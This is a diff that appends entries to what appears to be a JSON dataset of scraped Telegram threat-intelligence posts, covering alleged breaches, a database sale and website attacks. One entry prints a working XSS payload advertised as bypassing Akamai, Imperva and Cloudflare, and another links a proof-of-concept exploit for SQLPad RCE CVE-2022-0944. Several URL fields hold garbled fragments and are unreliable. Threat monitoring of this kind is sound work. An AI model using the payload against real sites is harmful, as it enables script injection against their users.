@@ -4817,6 +4817,65 @@
                 "the Database of Nan Hospital"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 3228,
+            "Date": "2024-09-10",
+            "Content": "💡Daily Dose of Dread",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 3227,
+            "Date": "2024-09-10",
+            "Content": "🔗DarkWebInformer.com: New Threat Alert\n📅Date: 2024-09-10 20:48:41\n🚨Title: Al Ahad targets the website of Ukrainian State Center for International Education\n🛡Victims: ukrainian state center for international education, <http://studyinukraine.gov.ua|studyinukraine.gov.ua>\n🏭Industry: Government &amp; Public Sector\n🗺Country: Ukraine\n🔗Published URL: https://t.me/AlAhadSecurity/1500?single\n🕵️‍♂️Threat Actor: Al Ahad",
+            "Attack Type": "Unknown",
+            "Location": [
+                "Ukraine"
+            ],
+            "URLs": [
+                "🔗DarkWebInformer.com:",
+                "://studyinukraine.gov.ua|stu",
+                "yinukraine.gov.ua>\n🏭I",
+                "/t.me/AlAhadSecurity/1500?single\n🕵️‍♂️T"
+            ]
+        },
+        {
+            "Message ID": 3226,
+            "Date": "2024-09-10",
+            "Content": "you are late bot :/",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 3225,
+            "Date": "2024-09-10",
+            "Content": "🔗DarkWebInformer.com: New Threat Alert\n📅Date: 2024-09-10 20:26:23\n🚨Title: Alleged database sale of Nexgen\n🛡Victims: nexgen, <http://getnexgen.com|getnexgen.com>\n🏭Industry: Manufacturing\n🗺Country: USA\n🖼Screenshot Links: Unknown\n🕵️‍♂️Threat Actor: agreindex\n🔗Published URL: Unknown",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "🔗DarkWebInformer.com:",
+                "://getnexgen.com|get",
+                "exgen.com>\n🏭I"
+            ]
+        },
+        {
+            "Message ID": 3224,
+            "Date": "2024-09-10",
+            "Content": "🚨A Threat Actor is Allegedly Selling the Database of Nexgen",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "RipperSec (ريفرسيچ)": [
@@ -9023,6 +9082,31 @@
             ],
             "URLs": [
                 "https://ocafe-gourmand.fr/"
+            ]
+        },
+        {
+            "Message ID": 1953,
+            "Date": "2024-09-10",
+            "Content": "https://github.com/FlojBoj/CVE-2022-0944\n\nSQLPad - Template injection (POC exploit for SQLPad RCE [CVE-2022-0944])\n#github #exploit",
+            "Attack Type": "Hacking",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "https://github.com/FlojBoj/CVE-2022-0944"
+            ]
+        },
+        {
+            "Message ID": 1952,
+            "Date": "2024-09-10",
+            "Content": "XSS Bypass Akamai, Imperva and CloudFlare\n\nPayload :\n\n<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>\n\n\n#exploit #poc #XSS",
+            "Attack Type": "Unknown",
+            "Location": [
+                "Imperva",
+                "XSS"
+            ],
+            "URLs": [
+                "X55.is"
             ]
         }
     ],
